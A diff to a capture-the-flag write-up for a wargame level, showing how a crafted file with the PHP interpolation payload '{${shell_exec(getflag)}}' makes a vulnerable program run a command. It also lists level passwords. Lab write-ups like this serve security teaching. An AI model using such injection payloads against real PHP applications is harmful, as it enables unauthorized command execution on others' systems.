@@ -19,14 +19,15 @@ pass : viuaaale9huek52boumoomioc
       - with variable variables we can use interpolation ```${$x}```
       - ```${shell_exec(getflag)}``` ==> failed evaluation code ==> php try to execute but can't
       - ```{${shell_exec(getflag)}}``` ==> undefined variable but getflag is executed !
-            
 
 ## Solution
-- ```echo '[x {${shell_exec(getflag)}}]' > /tmp/file```
-- ```./level06 /tmp/file```
+```bash
+echo '[x {${shell_exec(getflag)}}]' > /tmp/file
+./level06 /tmp/file
+```
 
-no flag
-level07 : wiok45aaoguiboiki2tuin6ub
+- no flag
+- level07 : wiok45aaoguiboiki2tuin6ub
 
 ## Resolve problem
 - always sanitize your data
